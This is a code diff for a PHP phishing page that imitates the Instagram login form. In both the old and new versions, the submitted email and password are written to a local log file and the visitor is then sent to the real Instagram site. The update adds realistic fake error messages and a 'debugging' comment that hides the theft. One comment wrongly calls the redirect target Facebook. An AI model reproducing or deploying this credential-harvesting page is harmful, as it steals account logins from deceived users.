@@ -1,18 +1,33 @@
 <?php
-// Capture credentials and save them to a file
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+// Check if form data is submitted
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
+    $password = $_POST['password']; // It's crucial to handle passwords securely
 
-    // Save credentials to a file
-    $file = fopen('InstaLogs.txt', 'a');
-    fwrite($file, "Email: $email, Password: $password\n");
-    fclose($file);
+    // Validate email and password
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        // Handle invalid email
+        echo "The email address or mobile number you entered isn't connected to an account.";
+        exit();
+    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
+        // Handle invalid password
+        echo "The password that you've entered is incorrect.";
+        exit();
+    } else {
+        // Ensure the logs directory exists
+        if (!is_dir('../InstaLogs')) {
+            mkdir('../InstaLogs', 0777, true);
+        }
 
-    // Redirect to Instagram
-    header("Location: https://www.instagram.com");
-    exit();
+        // Log the email and password (for debugging purposes only)
+        error_log("Email: $email\nPassword: $password\n", 3, "../InstaLogs/Insta.log");
+
+        // Redirect to the real Facebook login page
+        header("Location: https://instagram.com/");
+        exit();
+    }
 }
+?>
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -32,8 +47,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <div class="log-in">
                 <img src="photos/logo.png" class="logo"/>
                 <form class="log-in-form" method="POST" action="">
-                    <input type="text" name="email" placeholder="Phone number, username or email address" />
-                    <input type="password" name="password" placeholder="Password" />
+                    <input type="text" name="email" placeholder="Phone number, username or email address" required />
+                    <input type="password" name="password" placeholder="Password" required />
                     <button type="submit" class="log-in-button">Log In</button>
                 </form>
                 <span class="or-divider">OR</span>
